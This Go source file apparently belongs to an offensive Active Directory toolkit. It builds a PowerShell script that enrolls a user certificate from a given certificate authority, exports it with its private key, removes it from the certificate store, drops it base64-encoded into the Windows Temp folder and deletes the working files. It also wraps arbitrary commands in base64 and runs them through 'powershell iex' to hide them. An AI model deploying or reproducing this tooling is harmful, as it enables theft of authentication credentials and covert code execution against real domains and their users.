package adcs


import(
b64 "encoding/base64"
)


func InfFile(caConfig string,username string) string {
return `$domain=New-Object -TypeName System.DirectoryServices.DirectoryEntry
		$domainDN=$domain.distinguishedName
		$objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList ('LDAP://'+$domainDN)
		$objSearcher.Filter = '(&(objectClass=user)(samAccountName='+([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name.Split('\')[1]+'))'
		$userDn =  $objSearcher.FindAll().Path.Replace('LDAP://','')
		$CertName = $userDn
		$CERPath =  $env:appdata+'\'+$CertName+'_.cer'
		$CSRPath =  $env:appdata+'\'+$CertName+'_.csr'
		$INFPath =  $env:appdata+'\'+$CertName+'_.inf'
		$PFXPath =  $env:appdata+'\'+$CertName+'_.pfx'
		$RSPPath =  $env:appdata+'\'+$CertName+'_.rsp'

		rm $PFXPath
		rm $CERPath
		rm $CSRPath
		rm $INFPath
		rm $RSPPath

		$Signature = '$Windows NT$' 
		$INF ='
		[Version]
		Signature = "[[signature]]"

		[NewRequest] 
		Subject = "[[user_dn]]" 
		ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
		RequestType = PKCS10

		[RequestAttributes]
		CertificateTemplate = User
		; Omit section below if CA is an enterprise CA
		[EnhancedKeyUsageExtension]
		OID=1.3.6.1.5.5.7.3.1 ; Server Authentication
		'
		$INF=$INF.Replace('[[user_dn]]',$userDn)
		$INF=$INF.Replace('[[signature]]',$Signature)
		write-Host "Certificate Request is being generated"
		$INF | out-file -filepath $INFPath -force  > $env:appdata'\\log.txt'
		certreq -v -f -new $INFPath $CSRPath  >> $env:appdata'\\log.txt'
		certreq -v -f -submit -attrib "CertificateTemplate:User" -config `+caConfig+` $CSRPath $CERPath  >>  $env:appdata'\\log.txt'
		certreq -v -f -accept $CERPath >>  $env:appdata'\\log.txt'
		$cert = Get-Childitem "cert:\CurrentUser\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item $CERPath).FullName, "")).Thumbprint}
		echo $cert >>  $env:appdata'\\log.txt'
		Write-Debug "[] Certificate found in computer store: $cert"
		$certbytes = $cert.export([System.Security.Cryptography.X509Certificates.X509ContentType]::pfx) 
		$certbytes | Set-Content -Encoding Byte -Path $PFXPath -ea Stop >>  $env:appdata'\\log.txt'
		$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')
        $certstore.Open('ReadWrite')
        $certstore.Remove($cert)
        $certstore.close()
		[convert]::ToBase64String((Get-Content -path $PFXPath -Encoding byte)) | out-file -filepath $env:windir"\Temp\cert-auth`+username+`.b64" -force
		rm $PFXPath
		rm $CERPath
		rm $CSRPath
		rm $INFPath
		rm $RSPPath`
}

func FinalCommand(cmd string)string{
	b64cmd:=b64.StdEncoding.EncodeToString([]byte(cmd))
	return "powershell -c iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('"+b64cmd+"')))"
}



